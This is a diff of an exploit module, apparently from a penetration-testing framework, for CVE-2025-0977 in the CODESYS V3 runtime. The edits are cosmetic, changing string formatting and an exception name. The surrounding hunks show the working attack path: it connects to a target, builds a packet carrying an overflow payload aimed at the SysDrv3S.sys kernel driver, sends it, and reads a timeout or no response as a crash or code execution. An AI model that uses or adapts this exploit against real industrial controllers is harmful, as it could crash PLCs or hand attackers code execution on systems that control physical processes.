@@ -91,7 +91,7 @@ class Exploit(Exploit):
             print_info("Reference: https://nvd.nist.gov/vuln/detail/CVE-2025-0977")
             return
 
-        print_status("[CVE-2025-0977] Targeting CODESYS V3 runtime at {}:{} ...".format(self.target, self.port))
+        print_status(f"[CVE-2025-0977] Targeting CODESYS V3 runtime at {self.target}:{self.port} ...")
         try:
             sock = socket.socket()
             sock.settimeout(10)
@@ -107,7 +107,7 @@ class Exploit(Exploit):
             msg_length      = struct.pack("<I", len(overflow_data))
             packet          = CODESYS_MAGIC + CODESYS_VERSION + MSG_SCHED + msg_length + overflow_data
 
-            print_status("[CVE-2025-0977] Sending kernel driver overflow payload ({} bytes) ...".format(len(packet)))
+            print_status(f"[CVE-2025-0977] Sending kernel driver overflow payload ({len(packet)} bytes) ...")
             sock.sendall(packet)
 
             import time; time.sleep(0.5)
@@ -117,12 +117,12 @@ class Exploit(Exploit):
                     print_success("[CVE-2025-0977] Response received — runtime still up, check for kernel exploit indicators")
                 else:
                     print_success("[CVE-2025-0977] No response — kernel crash or code execution likely triggered")
-            except socket.timeout:
+            except TimeoutError:
                 print_success("[CVE-2025-0977] Timeout after payload — SysDrv3S.sys overflow likely triggered")
         except ConnectionRefusedError:
-            print_warning("[CVE-2025-0977] Connection refused — CODESYS runtime not on port {}".format(self.port))
+            print_warning(f"[CVE-2025-0977] Connection refused — CODESYS runtime not on port {self.port}")
         except Exception as exc:
-            print_error("[CVE-2025-0977] Error: {}".format(exc))
+            print_error(f"[CVE-2025-0977] Error: {exc}")
         finally:
             try:
                 sock.close()
